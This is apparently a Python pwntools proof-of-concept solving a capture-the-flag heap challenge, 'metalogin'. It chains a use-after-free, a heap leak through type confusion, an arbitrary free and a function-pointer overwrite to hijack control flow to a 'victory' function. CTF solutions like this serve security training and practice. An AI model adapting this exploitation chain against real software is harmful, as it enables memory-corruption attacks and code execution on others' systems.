#!/usr/bin/env python3
"""
MetaLogin Challenge Exploit POC
Demonstrates WMP: 
    WMI-1 - Stale Reference, 
    WMI-2 - Leak via Type Confusion, 
    WMI-3 - Arbitrary Free,
    WMI-4 - Write-What-Where
    Trigger Control Flow Hijack

Exploitation Overview:
1. Leak print_card address (given at startup)
2. Create stale reference (set avatar, then clear)
3. Leak heap address via type confusion (stale username pointer)
4. Calculate render_functions location from heap leak
5. Setup arbitrary free (add item with render_functions as target)
6. Trigger arbitrary free (clear inventory)
7. Overwrite freed location (add item with print_card address)
8. Trigger hijacked function (test render calls print_card)
"""

import re
import struct
from pwn import *

def parse_leak(output):
    """Extract the print_card address from the initial leak"""
    match = re.search(r'\[LIBRARIAN\] Maybe this will help\((0x[0-9a-f]+)\)', output)
    if match:
        leak_addr = int(match.group(1), 16)
        print(f"[+] Leaked print_card address: {hex(leak_addr)} ({leak_addr})")
        return leak_addr
    return None

def parse_heap_leak(output):
    """Extract heap address from the hex dump during Test Render"""
    # Looking for the hex dump line: "║ 40 B3 4C 4E E9 64 00 00 | 57 44 C3 5A 80 FF F9 6C ║"
    # This represents the first 16 bytes of the freed avatar structure
    # The first 8 bytes are a pointer (little-endian)
    match = re.search(r'║ ([0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2} [0-9A-F]{2})', output)
    if match:
        hex_bytes = match.group(1).split()
        # Convert to little-endian 64-bit address
        heap_addr = 0
        for i, byte_str in enumerate(hex_bytes):
            heap_addr |= (int(byte_str, 16) << (i * 8))
        
        # Calculate render_functions address from leaked heap pointer
        # render_functions allocated early in init, avatar allocated later
        # Offset between them determined by heap layout (0x80 bytes)
        render_functions_addr = heap_addr - 0x80
        print(f"[+] Leaked heap address: {hex(heap_addr)} ({heap_addr})")
        print(f"[+] Calculated render_functions address: {hex(render_functions_addr)} ({render_functions_addr})")
        return render_functions_addr
    return None

def exploit():
    # Start the process
    p = process('./metalogin')
    
    # Read banner and initial output
    output = p.recvuntil(b'Choice: ', timeout=2).decode()
    print(output)
    
    # Step 1: Parse the initial leak (print_card address - "What")
    print_card_addr = parse_leak(output)
    if not print_card_addr:
        print("[-] Failed to parse initial leak!")
        p.close()
        return
    
    print("\n" + "="*60)
    print("EXPLOITATION CHAIN")
    print("="*60)
    
    # Step 2: Heap Groom - Set Avatar (da5id_m / LA_castle)
    print("\n[*] Step 1: Heap Groom - Setting Black Sun Member avatar...")
    p.sendline(b'1')
    p.recvuntil(b'Enter username: ')
    p.sendline(b'da5id_m')
    p.recvuntil(b'Enter access code: ')
    p.sendline(b'LA_castle')
    p.recvuntil(b'Choice: ')
    print("    ✓ Avatar set (allocates avatar structure)")
    
    # Step 3: WMI-1 - Create Stale Reference (Clear Avatar)
    print("\n[*] Step 2: WMI-1 - Creating stale reference...")
    p.sendline(b'2')
    p.recvuntil(b'Choice: ')
    print("    ✓ Avatar cleared (frees avatar but pointer remains in g_session)")
    
    # Step 4: Heap Groom - Set Start Location
    print("\n[*] Step 3: Heap Groom - Setting start location...")
    p.sendline(b'3')
    p.recvuntil(b'Enter Start Location Name: ')
    p.sendline(b'127')  # Port number to trigger coordinate calculation
    p.recvuntil(b'Choice: ')
    print("    ✓ Start location set (reallocates at freed avatar username address)")
    
    # Step 5: WMI-2 - Leak via Type Confusion (Test Render)
    print("\n[*] Step 4: WMI-2 - Leaking heap address via type confusion...")
    p.sendline(b'9')
    render_output = p.recvuntil(b'Choice: ').decode()
    print(render_output)
    
    render_functions_addr = parse_heap_leak(render_output)
    if not render_functions_addr:
        print("[-] Failed to parse heap leak!")
        p.close()
        return
    
    # Step 6: Heap Groom - Add Item (with empty name, but important for heap state)
    print("\n[*] Step 5: Heap Groom - Adding item with render_functions address...")
    print("     item->inventory_obj will be interpreted as pointer during clear")
    p.sendline(b'5')
    p.recvuntil(b'Enter item name (max 15 chars): ')
    p.sendline(b'')  # Empty name
    p.recvuntil(b'Enter item number: ')
    p.sendline(str(render_functions_addr).encode())
    p.recvuntil(b'Choice: ')
    print(f"    ✓ Item added with number {render_functions_addr} (prepares for arbitrary free)")
    
    # WMI-3: Arbitrary Free
    # inventory_clear_all() follows stale g_session.current_avatar->inventory
    # Reads item pointer from freed avatar memory
    # Interprets item->inventory_obj (which contains render_functions_addr) as pointer
    # Frees that address, making render_functions available for reallocation
    print("\n[*] Step 6: WMI-3 - Arbitrary free of render_functions...")
    p.sendline(b'8')
    p.recvuntil(b'Choice: ')
    print("    ✓ inventory_clear_all() follows stale avatar->inventory pointer")
    print("    ✓ Reads item struct, interprets item->inventory_obj as pointer to free")
    print("    ✓ Frees render_functions address (adds to allocator free list)")
    
    # WMI-4: Write-What-Where (Add Item with print_card address)
    # Next item allocation reclaims freed render_functions memory
    # item->inventory_obj field overlaps render_functions[0]
    # Writing print_card_addr to inventory_obj overwrites function pointer
    print("\n[*] Step 7: WMI-4 - Overwriting render_functions[0] with print_card...")
    p.sendline(b'5')
    p.recvuntil(b'Enter item name (max 15 chars): ')
    p.sendline(b'')  # Empty name
    p.recvuntil(b'Enter item number: ')
    p.sendline(str(print_card_addr).encode())
    p.recvuntil(b'Choice: ')
    print(f"    ✓ Item added with number {print_card_addr} (overwrites function pointer)")
    
    # Step 9: Trigger Execution (Test Render)
    print("\n[*] Step 8: Triggering execution of print_card...")
    print("="*60)
    p.sendline(b'9')
    
    # Receive the victory card
    result = p.recvuntil(b'Choice: ', timeout=2).decode()
    print(result)
    
    if 'TWENTY-FIVE' in result and 'MILLION' in result:
        print("\n" + "="*60)
        print("SUCCESS! 💰 The $25 Million Hong Kong Dollars card was printed!")
        print("="*60)
    else:
        print("\n[-] Exploit may have failed - expected card not found")
    
    # Clean exit
    p.sendline(b'0')
    p.close()

if __name__ == '__main__':
    exploit()